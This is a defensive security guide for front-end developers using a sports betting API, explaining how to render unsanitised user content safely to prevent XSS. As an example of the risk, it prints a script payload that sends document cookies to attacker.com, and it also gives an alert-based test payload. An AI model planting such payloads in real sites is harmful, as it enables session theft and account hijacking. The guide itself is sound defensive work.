# Frontend Security Requirements

## XSS Prevention - CRITICAL

The Sports Betting API stores user-generated content (descriptions, names, etc.) as-is without sanitization. **Frontend applications MUST properly encode all user-generated content before rendering to prevent Cross-Site Scripting (XSS) attacks.**

### ⚠️ Risk

Attackers can store malicious JavaScript in fields like transaction descriptions:
```json
{
  "description": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
}
```

If rendered unsafely in a browser, this script will execute and can:
- Steal session tokens and cookies
- Hijack user accounts
- Log keystrokes
- Display fake login forms

### ✅ Required: Safe Rendering

**NEVER use `innerHTML` or similar methods with API data:**

```javascript
// ❌ DANGEROUS - DO NOT DO THIS
div.innerHTML = `Description: ${transaction.description}`;
element.innerHTML = apiResponse.name;
```

**ALWAYS use safe methods:**

```javascript
// ✅ SAFE - Use textContent
div.textContent = transaction.description;

// ✅ SAFE - Use createTextNode
const textNode = document.createTextNode(transaction.description);
div.appendChild(textNode);

// ✅ SAFE - HTML escape function
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
div.innerHTML = `Description: ${escapeHtml(transaction.description)}`;

// ✅ SAFE - Modern frameworks (auto-escape by default)
// React: <div>{transaction.description}</div>
// Vue: <div>{{ transaction.description }}</div>
// Angular: <div>{{ transaction.description }}</div>
```

### Fields Requiring Sanitization

The following API response fields contain user-generated content:

**Transactions:**
- `description`

**Bets:**
- `selections[].eventName`
- `selections[].marketName`
- `selections[].outcomeName`

**Events:**
- `name`
- `venue`
- `homeTeamName`
- `awayTeamName`

**Markets:**
- `name`
- `description`

**Outcomes:**
- `name`
- `description`

**Users (if exposed):**
- `username`
- `email`

### Framework-Specific Guidance

**React:**
```jsx
// ✅ Auto-escaped by default
<div>{transaction.description}</div>

// ❌ Dangerous - only use with trusted content
<div dangerouslySetInnerHTML={{__html: description}} />
```

**Vue:**
```vue
<!-- ✅ Auto-escaped by default -->
<div>{{ transaction.description }}</div>

<!-- ❌ Dangerous - only use with trusted content -->
<div v-html="description"></div>
```

**Angular:**
```html
<!-- ✅ Auto-escaped by default -->
<div>{{ transaction.description }}</div>

<!-- ❌ Dangerous - only use with trusted content -->
<div [innerHTML]="description"></div>
```

**Vanilla JavaScript:**
```javascript
// ✅ Use textContent
element.textContent = apiData.description;

// ❌ NEVER use innerHTML with API data
element.innerHTML = apiData.description; // DANGEROUS!
```

### Testing Your Frontend

1. Create a test transaction with this description:
   ```
   <img src=x onerror=alert('XSS')>
   ```

2. View it in your UI:
   - **If you see an alert popup** → ❌ VULNERABLE, fix immediately
   - **If you see the text literally** → ✅ SAFE

### Content Security Policy (Recommended)

Add a Content Security Policy header to your frontend:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

This provides defense-in-depth even if XSS vulnerabilities exist.

---

**Summary:** Always treat data from the API as untrusted user input. Use `textContent` or framework auto-escaping. Never use `innerHTML` with API data.
